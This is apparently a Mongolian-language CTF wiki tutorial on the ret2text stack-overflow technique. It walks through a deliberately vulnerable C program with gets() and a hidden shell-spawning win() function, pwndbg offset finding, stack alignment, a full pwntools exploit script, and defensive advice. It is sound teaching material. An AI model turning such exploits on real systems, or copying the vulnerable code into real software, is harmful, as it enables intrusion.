---
title: ret2text
description: Stack overflow ашиглан программын өөрийн код (.text) руу үсрэх хамгийн энгийн ROP арга.
---

**ret2text** (return-to-text) нь stack overflow-оор функцийн **буцах хаяг (return address)**-ийг дарж бичээд,
программ дотор **аль хэдийн байгаа** кодын хэсэг рүү үсрэх арга юм. Нэр нь ELF файлын `.text`
хэсгээс гаралтай — программын машин код тэнд байрладаг.

Ихэнх CTF бодлогод `win()`, `flag()`, `shell()` гэх мэт хэзээ ч дуудагддаггүй функц
байдаг. Иймээс ret2text-ийг **ret2win** гэж бас нэрлэдэг.

:::note[Урьдчилсан мэдлэг]
- C хэлний үндэс, `gets()`/`read()` зэрэг функц
- x86-64 assembly-ийн суурь (`push`, `call`, `leave`, `ret`)
- `gdb` (pwndbg эсвэл GEF) болон Python-ий `pwntools` — gdb-г анх удаа ашиглаж байвал [pwndbg үндэс](../../tools/gdb/) хуудсыг уншаарай
:::

## Санаа

Функц дуудагдах үед stack дээр дараах бүтэц үүснэ (64-bit):

```ansi
[1m их хаяг[0m                        [36m▲[0m
[90m┌──────────────────────────┐[0m                   [36m│[0m
[90m│[0m[1;31m  return address  (8 B)   [0m[90m│[0m  ← rbp + 8      [36m│[0m  [1;31m← бид үүнийг дарж бичнэ[0m
[90m├──────────────────────────┤[0m                   [36m│[0m
[90m│[0m[33m  saved rbp       (8 B)   [0m[90m│[0m  ← rbp          [36m│[0m
[90m├──────────────────────────┤[0m                   [36m│[0m  [36mgets() өгөгдлийг[0m
[90m│[0m[32m                          [0m[90m│[0m                 [36m│[0m  [36mэнэ чиглэлд бичнэ[0m
[90m│[0m[32m  char buf[...]           [0m[90m│[0m                 [36m│[0m
[90m│[0m[32m                          [0m[90m│[0m  ← buf          [36m│[0m  [32m← өгөгдөл эндээс эхэлнэ[0m
[90m└──────────────────────────┘[0m
[1m бага хаяг[0m
```

`gets()` шиг урт шалгадаггүй функц `buf`-аас илүү өгөгдөл хүлээж авбал өгөгдөл **дээшээ** (их хаяг руу)
урсаж, `saved rbp`, улмаар `return address`-ийг дарна. Функц `ret` заавар гүйцэтгэх үед CPU stack-ийн оройгоос
хаягийг аваад тийш үсэрдэг — тэр хаяг одоо **бидний сонгосон** хаяг болсон байна.

Тиймээс халдлагын өгөгдөл (payload) ердөө хоёр хэсэгтэй:

```ansi
[32m[ buf ................ ][0m[33m[ saved rbp ][0m[1;31m[ зорилтот хаяг ][0m
[90m └──────── padding (offset) ────────┘ └─ return address ─┘[0m
```

Бидэнд хоёр зүйл л олох хэрэгтэй:

1. **Offset** — `buf`-ийн эхнээс return address хүртэл хэдэн байт байгаа вэ?
2. **Зорилтот хаяг** — хаашаа үсрэх вэ?

ret2text ажиллах нөхцөл:

| Хамгаалалт | Шаардлага | Яагаад |
|------------|-----------|--------|
| Stack canary | **Байхгүй** | Canary байвал overflow-ийг `ret`-ээс өмнө илрүүлээд программыг зогсооно |
| PIE | **Байхгүй** (эсвэл хаяг leak хийсэн) | PIE байвал `.text`-ийн хаяг ажиллах бүрт өөрчлөгдөнө |
| NX | Хамаагүй | Бид shellcode ажиллуулахгүй, байгаа кодыг л ашиглана |

## Бодлого

Бүх файл [`challenges/pwn/ret2text`](https://github.com/computer-communication-security-club/ctf-wiki/tree/main/challenges/pwn/ret2text) хавтсанд байна:

| Файл | Тайлбар |
|------|---------|
| [`main.c`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/ret2text/main.c) | Эх код |
| [`ret2text`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/ret2text/ret2text) | Бэлэн binary (Ubuntu 24.04 дээр compile хийсэн) |
| [`Dockerfile`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/ret2text/Dockerfile) | Challenge сервер (deploy) |
| [`Makefile`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/ret2text/Makefile) | `make run`, `make stop` |

:::tip
Бэлэн binary-г ашиглавал энэ хуудсан дээрх хаягууд (gdb гаралт гэх мэт) таных яг ижил гарна.
Өөрөө `gcc`-ээр compile хийвэл compiler-ийн хувилбараас хамаарч хаяг өөр байж болно.
:::

Challenge-ийг сервер хэлбэрээр ажиллуулах (Docker хэрэгтэй):

```console
$ cd challenges/pwn/ret2text
$ make run      # localhost:1337 дээр асна
$ nc localhost 1337
What is your name?
$ make stop     # зогсоох
```

Repo татахгүйгээр бэлэн image-ийг шууд ажиллуулж болно:

```console
$ docker run --rm -p 1337:1337 ghcr.io/computer-communication-security-club/pwn-ret2text
```

:::caution[Spoiler]
Доорх хэсэгт бүтэн шийдэл байна. Эхлээд өөрөө оролдоод үзээрэй!
:::

## Шийдэл

### 1. Эх кодыг унших

```c title="main.c"
#include <stdio.h>
#include <stdlib.h>

char *gets(char *s); // шинэ glibc-ийн header-аас gets() хасагдсан

void win(void) {
    puts("Congrats! Here is your shell:");
    system("/bin/sh");
}

void vuln(void) {
    char buf[64];
    puts("What is your name?");
    gets(buf);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("Bye!");
    return 0;
}
```

Хоёр зүйл анхаарал татна:

- `vuln()` дотор `gets(buf)` — урт шалгахгүй тул **stack overflow** байна.
- `win()` функц `system("/bin/sh")` дууддаг ч программ үүнийг **хэзээ ч дууддаггүй**.

Зорилго: `vuln()`-ийн return address-ийг `win()`-ийн хаягаар дарж бичих.

### 2. Хамгаалалт шалгах

```console
$ checksec --file=ret2text
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Canary байхгүй, PIE байхгүй — ret2text хийхэд тохиромжтой. Binary-г дараах флагуудаар compile хийсэн:

```console
$ gcc main.c -o ret2text -fno-stack-protector -no-pie
```

- `-fno-stack-protector` — canary-г унтраана
- `-no-pie` — `.text`-ийн хаягийг тогтмол болгоно

### 3. Зорилтот хаяг олох

pwndbg-ээр binary-г нээгээд `info functions` (`info fu`) командаар бүх функцийг жагсаана:

```ansi
$ gdb ./ret2text
[1;31mpwndbg>[0m info fu
All defined functions:

Non-debugging symbols:
[34m0x0000000000401000[0m  [33m_init[0m
[34m0x0000000000401070[0m  [33mputs@plt[0m
[34m0x0000000000401080[0m  [33msystem@plt[0m
[34m0x0000000000401090[0m  [33mgets@plt[0m
[34m0x00000000004010a0[0m  [33msetvbuf@plt[0m
[34m0x00000000004010b0[0m  [33m_start[0m
[34m0x00000000004010e0[0m  [33m_dl_relocate_static_pie[0m
[34m0x00000000004010f0[0m  [33mderegister_tm_clones[0m
[34m0x0000000000401120[0m  [33mregister_tm_clones[0m
[34m0x0000000000401160[0m  [33m__do_global_dtors_aux[0m
[34m0x0000000000401190[0m  [33mframe_dummy[0m
[34m0x0000000000401196[0m  [33mwin[0m
[34m0x00000000004011bf[0m  [33mvuln[0m
[34m0x00000000004011e9[0m  [33mmain[0m
[34m0x000000000040122c[0m  [33m_fini[0m
```

Зорилтот хаяг: **`0x401196`**. pwntools дээр `elf.sym.win` гэж автоматаар авна.

:::tip
Зорилтот хаяг заавал функцийн эхлэл байх албагүй. Функцийн **дунд** байгаа ямар ч зааврын хаяг руу үсэрч болно.
Жишээ нь шалгалт (`if`) бүхий функцэд шалгалтын дараах хаяг руу шууд үсэрч нөхцөлийг алгасаж болно.
:::

### 4. Offset олох

Offset-ийг тооцоолох шаардлагагүй — pwndbg-ээр шууд олно. Санаа нь: давтагдашгүй **cyclic pattern**-ийг
программд өгөөд, программ унах үед return address-ийн байранд pattern-ийн аль хэсэг очсоныг харах.

**1. Pattern үүсгээд программыг ажиллуулна.** Нэр асуухад pattern-ийг хуулж оруулна:

```ansi
[1;31mpwndbg>[0m !pwn cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[1;31mpwndbg>[0m r
Starting program: ./ret2text
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
What is your name?

Program received signal [31mSIGSEGV[0m, Segmentation fault.
[31m0x00000000004011e8[0m in vuln ()
```

**2. Context-ийг уншина.** Программ `SIGSEGV`-ээр унахад pwndbg бүх мэдээллийг харуулна:

```ansi
LEGEND: [33mSTACK[0m | [34mHEAP[0m | [31mCODE[0m | [35mDATA[0m | [31mWX[0m | RODATA
[34m───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────[0m
 [1mRAX[0m  [33m0x7fffffffd940[0m ◂— 0x6161616261616161 ('aaaabaaa')
 [1mRBX[0m  0
 [1mRCX[0m  [35m0x7ffff7e14760 (_IO_stdfile_0_lock)[0m ◂— 0
 [1mRDX[0m  [35m0x7ffff7e14760 (_IO_stdfile_0_lock)[0m ◂— 0
 [1mRDI[0m  [33m0x7fffffffd941[0m ◂— 'aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 [1mRSI[0m  [34m0x405011[0m ◂— 0x6361616162616161 ('aaabaaac')
 [1mR8[0m   [34m0x4050d9[0m ◂— 0
 [1mR9[0m   0xfbad2288
 [1mR10[0m  0
 [1mR11[0m  0x202
 [1mR12[0m  [33m0x7fffffffdac8[0m —▸ [33m0x7fffffffdea6[0m ◂— './ret2text'
 [1mR13[0m  1
 [1mR14[0m  [35m0x7ffff7ffd000 (_rtld_global)[0m —▸ [35m0x7ffff7ffe2e0[0m ◂— 0
 [1mR15[0m  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ [31m0x401160 (__do_global_dtors_aux)[0m ◂— endbr64
 [1mRBP[0m  0x6161617261616171 ('qaaaraaa')
 [1mRSP[0m  [33m0x7fffffffd988[0m ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 [1mRIP[0m  [31m0x4011e8 (vuln+41)[0m ◂— ret
[34m────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────[0m
[90m   0x4011e1 <vuln+34>    call   gets@plt                    <gets@plt>[0m
[90m   0x4011e6 <vuln+39>    nop[0m
[90m   0x4011e7 <vuln+40>    leave[0m
[1;32m ► [0m[31m0x4011e8[0m <vuln+41>    [38;5;148mret[0m                                <0x6161617461616173>
    ↓
[34m─────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────[0m
00:0000│ [1mrsp[0m [33m0x7fffffffd988[0m ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0008│     [33m0x7fffffffd990[0m ◂— 'uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0010│     [33m0x7fffffffd998[0m ◂— 'waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:0018│     [33m0x7fffffffd9a0[0m ◂— 'yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0020│     [33m0x7fffffffd9a8[0m ◂— 'baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0028│     [33m0x7fffffffd9b0[0m ◂— 'daabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0030│     [33m0x7fffffffd9b8[0m ◂— 'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
07:0038│     [33m0x7fffffffd9c0[0m ◂— 'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
[34m───────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────[0m
 [1;32m►[0m 0 [31m0x4011e8[0m           vuln+41
   1 0x6161617461616173
   2 0x6161617661616175
   3 0x6161617861616177
   4 0x6261617a61616179
   5 0x6261616362616162
   6 0x6261616562616164
   7 0x6261616762616166
[34m──────────────────────────────────────────[ LAST SIGNAL ]───────────────────────────────────────────[0m
Program received signal [31mSIGSEGV[0m (fault address: 0x0).
[34m────────────────────────────────────────────────────────────────────────────────────────────────────[0m
```

- **DISASM** — программ `vuln`-ийн `ret` заавар дээр унасан. `ret` нь `0x6161617461616173` хаяг руу буцах гэж оролдсон.
  Энэ бол бидний pattern (`'saaataaa'`) — return address дарагдсан гэсэн үг.
- **RSP** — stack-ийн орой `'saaataaa...'` байна. `ret` яг энэ утгыг буцах хаяг болгон авдаг.
- **RBP** — `'qaaaraaa'`: `saved rbp` ч мөн дарагдсан.

**3. Stack-ийн оройн 4 байтыг уншина:**

```ansi
[1;31mpwndbg>[0m x/x $rsp
[33m0x7fffffffd988[0m:    0x61616173
```

**4. Offset-ийг хайна.** `0x61616173` (`'saaa'`) pattern-ийн хэддүгээр байтаас эхэлдгийг `cyclic -l`-ээр олно:
`!pwn cyclic -l 0x61616173` → **72**.

Offset = **72**: эхний 72 байт `buf` болон `saved rbp`-г дүүргэж, дараагийн 8 байт return address болно.

### 5. Stack alignment (movaps асуудал)

Эхлээд хамгийн энгийн payload-ийг туршъя:

```python
payload = b'A' * 72 + p64(elf.sym.win)
```

`win()` руу үсэрч, `"Congrats!"` хэвлэгдэх ч **shell нээгдэхгүй**, `system()` дотор segfault болно.

Шалтгаан: x86-64 System V ABI-ийн дагуу `call` хийх үед `rsp` **16 байтад тэгшлэгдсэн** байх ёстой.
glibc-ийн `system()` дотор `movaps` заавар байдаг бөгөөд тэгшлэгдээгүй хаяг дээр унадаг.
Бид функцийг `call`-аар биш `ret`-ээр эхлүүлсэн тул stack 8 байтаар зөрсөн.

Шийдэл: `win`-ийн өмнө нэг **`ret` gadget** нэмэх. Энэ нь юу ч хийхгүй, зөвхөн stack-ийг 8 байтаар
шилжүүлж тэгшилнэ.

:::tip
Өөр нэг арга: `win`-ийн эхний `endbr64` (4 байт) ба `push rbp` (1 байт)-ийг алгасаж
`elf.sym.win + 5` (`0x40119b`) руу үсрэх. `push` хийгдэхгүй тул бас 8 байтын зөрүү засагдана.
:::

### 6. Exploit

```python title="exploit.py"
from pwn import *

elf = context.binary = ELF('./ret2text')
p = process()

offset = 72
ret = ROP(elf).find_gadget(['ret'])[0]   # stack-ийг 16 байтад тэгшлэх

payload = flat(
    b'A' * offset,   # buf + saved rbp
    ret,             # alignment
    elf.sym.win,     # win() функцийн хаяг
)

p.sendlineafter(b'name?\n', payload)
p.interactive()
```

```console
$ python3 exploit.py
[*] Switching to interactive mode
Congrats! Here is your shell:
$ cat flag.txt
```

`p64()`/`flat()` нь хаягийг **little-endian** 8 байт болгоно: `0x401196` → `\x96\x11\x40\x00\x00\x00\x00\x00`.
`elf.sym.win` нь хаягийг symbol table-аас автоматаар авдаг тул дахин compile хийсэн ч скрипт ажиллана.

## Хамгаалалт

- `gets()`-ийг **хэзээ ч** бүү ашигла — `fgets(buf, sizeof(buf), stdin)` ашигла.
- Stack canary (`-fstack-protector-strong`, ихэнх distro-д анхнаасаа идэвхтэй).
- PIE + ASLR (`-pie`, мөн анхнаасаа идэвхтэй) — хаягийг таамаглахад хэцүү болгоно.
- Шаардлагагүй "debug" функцийг (`system("/bin/sh")` гэх мэт) production код-д бүү үлдээ.

## Эх сурвалж

- [CTF Wiki — Basic ROP: ret2text](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text)
- [ir0nstone — ret2win](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win)
- [ir0nstone — De Bruijn Sequences](https://ir0nstone.gitbook.io/notes/binexp/stack/de-bruijn-sequences)
